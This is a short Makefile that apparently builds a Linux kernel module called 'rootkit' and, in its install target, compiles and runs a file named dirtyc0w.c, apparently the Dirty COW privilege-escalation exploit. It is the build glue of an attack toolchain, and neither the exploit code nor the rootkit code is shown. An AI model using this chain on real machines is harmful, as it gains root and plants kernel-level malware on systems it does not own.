obj-m += rootkit.o

all: rootkit.ko

rootkit.ko: rootkit.c
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

.PHONY: uninstall
uninstall:
	-sudo rmmod rootkit

.PHONY: install
install: rootkit.ko dirtyc0w.c
	gcc -D_GNU_SOURCE -pthread -o dirtyc0w dirtyc0w.c
	./dirtyc0w

.PHONY: clean
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm ./dirtyc0w
